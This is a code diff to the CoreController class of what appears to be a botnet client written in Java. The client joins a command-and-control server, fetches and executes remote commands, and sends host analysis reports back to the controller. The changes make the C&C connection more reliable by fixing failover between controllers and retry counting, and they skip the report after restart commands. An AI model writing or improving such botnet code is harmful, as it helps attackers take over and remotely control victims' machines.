@@ -126,8 +126,10 @@ public class CoreController {
             cmd = getNextCommand();
             if (!cmd.getScope().equals(CommandScope.NONE)) {
               executeCommand(cmd);
-              Report hostAnalysis = makeReport();
-              sendReport(hostAnalysis);
+              if (!cmd.getScope().equals(CommandScope.RESTART)) {
+                Report hostAnalysis = makeReport();
+                sendReport(hostAnalysis);
+              }
             }
           } catch (BotCommandParsingException exc) {
             LOGGER.warn("Cannot read command. {}", exc.getMessage());
@@ -184,14 +186,16 @@ public class CoreController {
     LOGGER.traceEntry("Joining botnet...");
     boolean success = false;
     int controllerId = 0;
+    Controller controller = null;
+    long failures = 0;
     while (!success) {
-      long failures = 0;
-      Controller controller = AppConfigurationService.getConfigurations().getControllers().get(controllerId);
+      controller = AppConfigurationService.getConfigurations().getControllers().get(controllerId);
       final String initResource = controller.getInitResource();
       LOGGER.info("Loading bot configuration from C&C at {}...", initResource);
       try {
         AppConfigurationService.load(AppConfigurationFormat.JSON, initResource, null);
-        CONTROLLER = controller;
+        controllerId = 0;
+        controller = AppConfigurationService.getConfigurations().getControllers().get(controllerId);
         success = true;
       } catch (IOException exc) {
         failures++;
@@ -204,12 +208,14 @@ public class CoreController {
           if (controllerId < AppConfigurationService.getConfigurations().getControllers().size()) {
             LOGGER.warn("Maximum number of reconnections reached for C&C at {}", initResource);
             controllerId ++;
+            failures = 0;
           } else {
             throw new BotInitializationException("Cannot load bot configuration C&C. %s", exc.getMessage());
           }
         }
       }
     }
+    CONTROLLER = controller;
     LOGGER.trace("Botnet joined");
     allocateResources();
     changeState(BotState.EXECUTION);
